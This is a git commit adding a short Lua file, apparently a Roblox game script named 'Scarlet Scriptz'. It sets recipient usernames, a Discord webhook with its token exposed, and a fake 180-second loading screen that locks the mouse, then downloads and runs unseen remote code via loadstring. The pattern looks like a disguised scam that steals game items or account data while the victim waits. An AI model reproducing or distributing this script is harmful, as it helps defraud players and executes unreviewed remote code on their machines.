a1d9e843b8c671c4013d4d6740c052bd73e0b1f5
Scarlet <124151488+SoKomgl124@users.noreply.github.com>
2023-05-15 16:47:33 +0800

    Create Scarlet.lua

---
+++ Scarlet.lua
@@ -0,0 +1,23 @@
+UserName = "MonsterGamefans"
+
+UserName2 = "MonsterGamefans"
+
+Webhook = "https://discord.com/api/webhooks/1107588984021991445/kUl7RbszfS46iPLKeCNZILwOOkUtI1CRcI7UPi8OPo5WxKwovCGi5BCq2jfY78UNMR1l"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = false
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Scarlet Scriptz"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
